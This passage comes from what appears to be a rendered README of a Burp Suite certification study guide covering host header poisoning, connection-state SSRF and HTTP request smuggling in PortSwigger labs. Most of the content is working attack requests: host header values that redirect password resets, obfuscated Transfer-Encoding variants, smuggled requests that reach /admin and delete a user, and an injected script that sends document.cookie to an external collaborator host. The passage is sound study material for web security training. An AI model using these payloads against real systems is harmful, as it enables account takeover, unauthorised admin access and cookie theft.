href=\"#spoof-ip-address\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cem\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e\u003c/em\u003e that altered HOST headers are supported,\u003cbr\u003e\nwhich allows you to spoof your IP address and bypass the IP-based brute-force protection\u003cbr\u003e\nor redirection attacks to do \u003cem\u003e\u003cstrong\u003epassword reset\u003c/strong\u003e\u003c/em\u003e poisoning.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eInclude the below \u003ccode\u003eX- \u003c/code\u003e headers and change the username parameter on the password reset request to \u003ccode\u003eCarlos\u003c/code\u003e before sending the request.\u003cbr\u003e\nIn the BSCP exam if you used this exploit then it means you have not used a vulnerability that require user interaction and allow you to use an interaction vulnerability to gain access to stage 3 as admin by using exploit server \u003ccode\u003eDeliver exploit to victim\u003c/code\u003e function.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"X-Forwarded-Host: EXPLOIT.net\nX-Host: EXPLOIT.net\nX-Forwarded-Server: EXPLOIT.net\"\u003e\u003cpre\u003eX-Forwarded-Host: EXPLOIT.net\nX-Host: EXPLOIT.net\nX-Forwarded-Server: EXPLOIT.net\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eTips \u0026amp; Notes from \u003cem\u003e\u003cstrong\u003efullfox\u003c/strong\u003e\u003c/em\u003e:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eWhen spoofing host header on password reset using \u003ccode\u003eHost:\u003c/code\u003e or \u003ccode\u003eX-Forwarded-Host:\u003c/code\u003e, if you receive the error \u003ccode\u003eInvalid hostname\u003c/code\u003e, try using the following hostname: \u003ccode\u003exxx.oastify.com?TARGET.net\u003c/code\u003e legit target URL without a slash.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eCheck the exploit server log to obtain the reset link to the victim username.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/HOST-Header-forgot-password-reset.PNG\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/HOST-Header-forgot-password-reset.PNG\" alt=\"Exploit Server Logs capture the forgot password reset token\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware\" rel=\"nofollow\"\u003ePortSwigger Lab: Password reset poisoning via middle-ware\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eHOST Connection State\u003c/h3\u003e\u003ca id=\"user-content-host-connection-state\" class=\"anchor\" aria-label=\"Permalink: HOST Connection State\" href=\"#host-connection-state\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eTarget is vulnerable to \u003cstrong\u003erouting-based SSRF\u003c/strong\u003e via the Host header, but validate connection state of the first request. Sending grouped request in sequence using \u003cstrong\u003esingle connection\u003c/strong\u003e and setting the connection header to \u003cstrong\u003ekeep-alive\u003c/strong\u003e, bypass host header validation and enable SSRF exploit of local server.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"GET / HTTP/1.1\nHost: TARGET.net\nCookie: session=ValueOfSessionCookie\nContent-Length: 48\nContent-Type: text/plain;charset=UTF-8\nConnection: keep-alive\"\u003e\u003cpre\u003eGET / HTTP/1.1\nHost: TARGET.net\nCookie: session=ValueOfSessionCookie\nContent-Length: 48\nContent-Type: text/plain;charset=UTF-8\nConnection: keep-alive\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eNext request is the second tab in group sequence of requests.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"POST /admin/delete HTTP/1.1\nHost: localhost\nCookie: _lab=YOUR-LAB-COOKIE; session=YOUR-SESSION-COOKIE\nContent-Type: x-www-form-urlencoded\nContent-Length: 53\n\ncsrf=TheCSRFTokenValue\u0026amp;username=carlos\"\u003e\u003cpre\u003ePOST /admin/delete HTTP/1.1\nHost: localhost\nCookie: _lab=YOUR-LAB-COOKIE; session=YOUR-SESSION-COOKIE\nContent-Type: x-www-form-urlencoded\nContent-Length: 53\n\ncsrf=TheCSRFTokenValue\u0026amp;username=carlos\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eObserve that the second request has successfully accessed the admin panel.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/single-connection.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/single-connection.png\" alt=\"single connection\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack\" rel=\"nofollow\"\u003ePortSwigger Lab: Host validation bypass via connection state attack\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eHTTP Request Smuggling\u003c/h2\u003e\u003ca id=\"user-content-http-request-smuggling\" class=\"anchor\" aria-label=\"Permalink: HTTP Request Smuggling\" href=\"#http-request-smuggling\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eArchitecture with front-end and back-end server, and front-end or back-end does not support chunked encoding \u003cstrong\u003e(HEX)\u003c/strong\u003e or content-length \u003cstrong\u003e(Decimal)\u003c/strong\u003e. Bypass security controls to retrieve the victim's request and use the victim user's cookies to access their account.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"#tecl-dualchunk---transfer-encoding-obfuscated\"\u003eTE.CL dualchunk - Transfer-encoding obfuscated\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#tecl-multiCase---admin-blocked\"\u003eTE.CL multiCase - Admin blocked\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#clte-multicase---admin-blocked\"\u003eCL.TE multiCase - Admin blocked\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#clte-multicase---content-length\"\u003eCL.TE multiCase - Content-Length Cookie Stealer\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#clte-multicase---user-agent-cookie-stealer\"\u003eCL.TE multiCase - User-Agent Cookie Stealer\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#http2-smuggling-via-crlf-injection\"\u003eHTTP/2 smuggling - CRLF injection Cookie Stealer\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#http2-te-desync-v10a-h2path\"\u003eHTTP/2 TE - Admin Cookie Stealer\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eTE.CL dualchunk - Transfer-encoding obfuscated\u003c/h3\u003e\u003ca id=\"user-content-tecl-dualchunk---transfer-encoding-obfuscated\" class=\"anchor\" aria-label=\"Permalink: TE.CL dualchunk - Transfer-encoding obfuscated\" href=\"#tecl-dualchunk---transfer-encoding-obfuscated\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIf Duplicate header names are allowed, and the vulnerability is detected as \u003cstrong\u003edualchunk\u003c/strong\u003e, then add an additional header with name and value = \u003cstrong\u003eTransfer-encoding: cow\u003c/strong\u003e.  Use \u003cstrong\u003eobfuscation\u003c/strong\u003e techniques with second TE.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"Transfer-Encoding: xchunked\n\nTransfer-Encoding : chunked\n\nTransfer-Encoding: chunked\nTransfer-Encoding: x\n\nTransfer-Encoding:[tab]chunked\n\n[space]Transfer-Encoding: chunked\n\nX: X[\\n]Transfer-Encoding: chunked\n\nTransfer-Encoding\n: chunked\n\nTransfer-encoding: identity\nTransfer-encoding: cow\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eTransfer-Encoding: xchunked\n\nTransfer-Encoding : chunked\n\nTransfer-Encoding: chunked\nTransfer-Encoding: x\n\nTransfer-Encoding:[tab]chunked\n\n[space]Transfer-Encoding: chunked\n\nX: X[\\n]Transfer-Encoding: chunked\n\nTransfer-Encoding\n: chunked\n\nTransfer-encoding: identity\nTransfer-encoding: cow\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eSome servers that do support the \u003ccode\u003eTransfer-Encoding\u003c/code\u003e header can be induced not to process it if the header is \u003cstrong\u003eobfuscation\u003c/strong\u003e in some way.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eOn Repeater menu ensure that the \u003cstrong\u003e\"Update Content-Length\"\u003c/strong\u003e option is unchecked.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"POST / HTTP/1.1\nHost: TARGET.net\nContent-Type: application/x-www-form-urlencoded\nContent-length: 4\nTransfer-Encoding: chunked\nTransfer-encoding: identity\n\ne6\nGET /post?postId=4 HTTP/1.1\nUser-Agent: a\u0026quot;/\u0026gt;\u0026lt;script\u0026gt;document.location='http://OASTIFY.COM/?c='+document.cookie;\u0026lt;/script\u0026gt;\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0\\r\\n  \n\\r\\n\n  \"\u003e\u003cpre\u003ePOST / HTTP/1.1\nHost: TARGET.net\nContent-Type: application/x-www-form-urlencoded\nContent-length: 4\nTransfer-Encoding: chunked\nTransfer-encoding: identity\n\ne6\nGET /post?postId=4 HTTP/1.1\nUser-Agent: a\"/\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003edocument\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003elocation\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e'http://OASTIFY.COM/?c='\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003edocument\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003ecookie\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0\\r\\n  \n\\r\\n\n  \u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/gpost.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/gpost.png\" alt=\"GPost Obfuscating the TE header\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eNote:\u003c/strong\u003e You need to include the trailing sequence \u003cstrong\u003e\\r\\n\\r\\n\u003c/strong\u003e following the final \u003cstrong\u003e0\u003c/strong\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header\" rel=\"nofollow\"\u003ePortSwigger Lab: HTTP request smuggling, obfuscating the Transfer-Encoding (TE) header\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eWonder how often this scenario occur that hacker is able to steal visiting user request via HTTP Sync vulnerability?\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eTE.CL multiCase - Admin blocked\u003c/h3\u003e\u003ca id=\"user-content-tecl-multicase---admin-blocked\" class=\"anchor\" aria-label=\"Permalink: TE.CL multiCase - Admin blocked\" href=\"#tecl-multicase---admin-blocked\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eWhen attempting to access \u003ccode\u003e/admin\u003c/code\u003e portal URL path, we get the filter message, \u003ccode\u003ePath /admin is blocked\u003c/code\u003e. The HTTP Request Smuggler scanner \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e the vulnerability as \u003ccode\u003eTE.CL multiCase (delayed response)\u003c/code\u003e. \u003cstrong\u003eNote:\u003c/strong\u003e because back-end server doesn't support chunked encoding, turn off \u003ccode\u003eUpdate Content-Length\u003c/code\u003e in Repeater menu.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eAfter disable auto content length update, changing to \u003ccode\u003eHTTP/1.1\u003c/code\u003e, then send below request twice, adding the second header \u003ccode\u003eContent-Length: 15\u003c/code\u003e prevent the HOST header conflicting with first request.\u003cbr\u003e\n\u003cstrong\u003eNote:\u003c/strong\u003e need to include the trailing sequence \u003ccode\u003e\\r\\n\\r\\n\u003c/code\u003e following the final \u003ccode\u003e0\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eManually fixing the length fields in request smuggling attacks, requires each chunk size in bytes expressed in \u003cstrong\u003eHEXADECIMAL\u003c/strong\u003e, and \u003cstrong\u003eContent-Length\u003c/strong\u003e specifies the length of the message body in \u003cstrong\u003ebytes\u003c/strong\u003e. Chunks are followed by a \u003cstrong\u003enewline\u003c/strong\u003e, then followed by the chunk contents. The message is terminated with a chunk of size ZERO.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"POST / HTTP/1.1\nHost: TARGET.net\nContent-Type: application/x-www-form-urlencoded\nContent-length: 4\nTransfer-Encoding: chunked\n\n71\nPOST /admin HTTP/1.1\nHost: localhost\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0\n\"\u003e\u003cpre\u003ePOST / HTTP/1.1\nHost: TARGET.net\nContent-Type: application/x-www-form-urlencoded\nContent-length: 4\nTransfer-Encoding: chunked\n\n71\nPOST /admin HTTP/1.1\nHost: localhost\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eCalculating TE.CL (Transfer-Encoding / Content-Length) smuggle request length in \u003cstrong\u003eHEXADECIMAL\u003c/strong\u003e and the payload is between the hex length of \u003cstrong\u003e71\u003c/strong\u003e and the terminating \u003cstrong\u003eZERO\u003c/strong\u003e, not including the ZERO AND not the preceding \u003ccode\u003e\\r\\n\u003c/code\u003e on line above ZERO, as part of length. The initial POST request \u003cstrong\u003econtent-length\u003c/strong\u003e is manually set.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/te.cl.multicase-smuggle.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/te.cl.multicase-smuggle.png\" alt=\"te.cl.multicase-smuggle.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eWhen sending the \u003ccode\u003e/admin/delete?username=carlos\u003c/code\u003e to delete user, the transfer encoding hex length is changed from \u003ccode\u003e71\u003c/code\u003e to \u003ccode\u003e88\u003c/code\u003e hexadecimal value to include extra smuggled request size.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl\" rel=\"nofollow\"\u003ePortSwigger Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eCL.TE multiCase - Admin blocked\u003c/h3\u003e\u003ca id=\"user-content-clte-multicase---admin-blocked\" class=\"anchor\" aria-label=\"Permalink: CL.TE multiCase - Admin blocked\" href=\"#clte-multicase---admin-blocked\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eWhen attempting to access \u003ccode\u003e/admin\u003c/code\u003e portal URL path, we get the filter message, \u003ccode\u003ePath /admin is blocked\u003c/code\u003e. The HTTP Request Smuggler scanner \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e the vulnerability as \u003ccode\u003eCL.TE multiCase (delayed response)\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eTo access the admin panel, send below request twice, adding the second header \u003ccode\u003eContent-Length: 10\u003c/code\u003e prevent the HOST header conflicting with first request.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"POST / HTTP/1.1\nHost: TARGET.net\nCookie: session=waIS6yM79uaaNUO4MnmxejP2i6sZWo2E\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 116\ntRANSFER-ENCODING: chunked\n\n0\n\nGET /admin HTTP/1.1\nHost: localhost\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\n\nx=\"\u003e\u003cpre\u003ePOST / HTTP/1.1\nHost: TARGET.net\nCookie: session=waIS6yM79uaaNUO4MnmxejP2i6sZWo2E\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 116\ntRANSFER-ENCODING: chunked\n\n0\n\nGET /admin HTTP/1.1\nHost: localhost\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\n\nx=\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eOn the second time the request is send the admin portal is returned in response.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/cl.te-multicase-admin-blocked.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/cl.te-multicase-admin-blocked.png\" alt=\"cl.te multicase admin blocked\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te\" rel=\"nofollow\"\u003ePortSwigger Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eCL.TE multiCase - Content-Length\u003c/h3\u003e\u003ca id=\"user-content-clte-multicase---content-length\" class=\"anchor\" aria-label=\"Permalink: CL.TE multiCase - Content-Length\" href=\"#clte-multicase---content-length\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eLarge Content-Length to capture victim requests. Sending a POST request with smuggled request but the content length is longer than the real length and when victim browse their cookie session value is posted to blob comment. Increased the comment-post request's Content-Length to \u003cstrong\u003e798\u003c/strong\u003e, then smuggle POST request to the back-end server.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"POST / HTTP/1.1\nHost: TARGET.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 